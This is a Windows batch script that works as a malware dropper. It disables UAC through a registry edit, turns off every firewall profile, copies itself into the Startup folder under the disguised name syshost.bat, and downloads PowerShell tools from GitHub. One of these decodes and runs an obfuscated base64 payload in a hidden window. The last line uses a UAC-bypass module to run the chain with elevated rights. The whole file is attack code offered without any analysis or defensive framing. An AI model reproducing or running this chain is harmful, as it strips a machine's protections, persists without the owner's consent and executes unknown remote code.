echo Windows Registry Editor Version 5.00>%Temp%\lua.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]>>%Temp%\lua.reg
echo "EnableLUA"=dword:00000000>>%Temp%\lua.reg


echo copy "%Temp%\render.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\syshost.bat">>%Temp%\render.bat
echo regedit /s lua.reg>%Temp%\render.bat
echo netsh advfirewall set allprofiles state off>>%Temp%\render.bat

echo cd "C:\Windows\System32\WindowsPowerShell\v1.0">>%Temp%\render.bat

echo powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Utility/Invoke-Decode.ps1');Invoke-Decode xVLRatswFH1OIP8gukIThqW4hdIE9jDarHjQ1NQpGSx7UORbW40tBekmbrLt33ftuFs3Cnvbni46ujr3nHMVTT6x/hSq4Hb5CApZsvMIJZ8C8jksVaHB4IBf2coUVqYJOm2y/kmOuPZjIZyseKYx3yw3HpyyBqmdK1sKL0snUfrcroTRPpcmE6UkbieSHIrCi8hs7QqC2FbgGmim1nztw5NBr9vrRv9e1z3qQuNOvE/TIAbnNaFGwbOmP2AWJMrpNcYSc3Y5Xsy1SW3lFwehZ6fPwC9/i23Ih4uw5qsdHnt0H3QBU1nCuyM1XlQtw36/f7RLXtjsiHJ4YP0ZeAyaOS/fDL72up03TAhWIwyeSJgnqNf9Pik8/H6bWvDMWDy00dV/yPeaHFBp936jS72SuJ9f6Yz81ZMyJ9OfcXf+0kcd14DBR7tk39gdKNBbaE+3Gwwa16+GSvnU8c9z6uiHTYozt2N17bz2J1lwB1vaO208iukTOPCehaNTHp5f8HDIRyNGDxyyi+FoRCTE3rmUqPID5dxphGDinHXsuCmfh1/4zLaRDtjbF3A9X0nU1kTmwfLYel0fbmikzKAlT1A6DJICgLQlQOmnnp01tn4A -IsString -OutputFilePath 1.ps1" >>%Temp%\render.bat

echo powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden 1.ps1 >>%Temp%\render.bat


C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Escalation/Invoke-PsUACme.ps1');Invoke-PsUACme -method oobe -Payload \"%Temp%\\render.bat\""